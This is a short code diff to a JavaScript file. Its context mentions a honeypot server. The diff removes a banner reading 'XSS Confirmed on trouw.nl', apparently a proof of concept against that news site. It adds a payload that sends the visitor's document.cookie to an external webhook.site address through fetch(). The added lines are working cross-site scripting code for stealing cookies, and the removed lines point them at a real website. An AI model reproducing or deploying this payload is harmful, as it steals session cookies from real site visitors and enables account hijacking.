@@ -85,10 +85,7 @@
 //     console.log('Honeypot running at http://3.7.71.39:3001');
 // });
 
+console.log("XSS Executed! Sending to webhook...");
+document.body.style.backgroundColor = "orange";
+fetch("https://webhook.site/1058df3b-47af-4f36-81ac-769b03d17414?cookie=" + encodeURIComponent(document.cookie));
 
-  console.log("XSS Executed Successfully!");
-  document.body.innerHTML += `
-    <div style="position:fixed; top:10px; left:10px; background:red; color:white; padding:10px; font-size:20px; z-index:9999;">
-      🔥 XSS Confirmed on trouw.nl 🔥
-    </div>
-  `;
